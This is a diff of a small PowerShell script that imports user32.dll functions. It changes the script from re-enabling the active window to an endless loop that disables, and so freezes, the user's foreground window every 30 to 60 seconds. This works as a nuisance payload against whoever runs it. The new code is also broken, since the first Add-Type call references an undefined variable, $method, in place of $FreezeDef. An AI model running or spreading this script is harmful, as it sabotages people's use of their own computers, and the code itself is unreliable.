@@ -1,13 +1,19 @@
-add-type @"
-    using system;
-    using system.runtime.interopservices;
-    public class userwindows {
-        [DLLImport("User32.dll")]
-        public static extern intptr GetForeGroundWindow();
-}
-"@
-$activehandle=[userwindows]::getforegroundwindow()
+$FreezeDef = @'
+[DllImport("user32.dll")]
+public static extern bool EnableWindow(long hWnd, int bEnable);
+'@
+$Freeze=add-type -MemberDefinition $method -name NativeMethods -passthru
 
-$method='[dllimport("user32.dll")] public static extern bool EnableWindow(long hWnd, int bEnable);'
-add-type -MemberDefinition $method -name NativeMethods -namespace win32
-[win32.nativemethods]::enablewindow($activehandle, 1)
+$activewindowDef = @'
+[DllImport("user32.dll")]
+public static extern IntPtr GetForegroundWindow();
+'@
+$GetActiveWindow=add-type -MemberDefinition $activewindowDef -name getactivewindow -passthru
+
+
+while ($true) {
+$activehandle = $getactivewindow::getforegroundwindow()
+$freeze::enablewindow($activehandle, 0)
+
+sleep (get-random -minimum 30 -maximum 60)
+}
